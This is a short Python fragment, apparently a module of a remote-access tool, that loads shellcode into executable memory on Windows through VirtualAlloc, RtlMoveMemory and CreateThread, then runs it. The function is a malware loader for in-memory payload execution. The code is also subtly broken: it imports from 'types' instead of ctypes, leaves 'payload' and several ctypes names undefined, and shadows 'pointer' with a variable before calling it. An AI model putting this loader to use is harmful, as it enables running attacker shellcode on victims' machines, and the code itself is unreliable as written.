



def work( storage, message ) :

	from types import windll, c_char_p
	shellcode = payload
	sc = c_char_p(shellcode)
	# Reserves or commits a region of pages in the virtual address space of the calling process.
	pointer = windll.kernel32.VirtualAlloc(c_int(0),
									   c_int(len(sc)),
									   c_int(0x3000),
									   c_int(0x40))
	buffer = (c_char * len(sc)).from_buffer(sc)

	# The RtlMoveMemory routine copies the contents of a source memory block to a destination
	# memory block, and supports overlapping source and destination memory blocks.
	windll.kernel32.RtlMoveMemory(c_int(pointer),
								  buffer,
								  c_int(len(sc)))
	# Creates a thread to execute within the virtual address space of the calling process.
	ht = windll.kernel32.CreateThread(c_int(0),
									  c_int(0),
									  c_int(pointer),
									  c_int(0),
									  c_int(0),
									  pointer(c_int(0)))
	# Waits until the specified object is in the signaled state or the time-out interval elapses.
	windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))
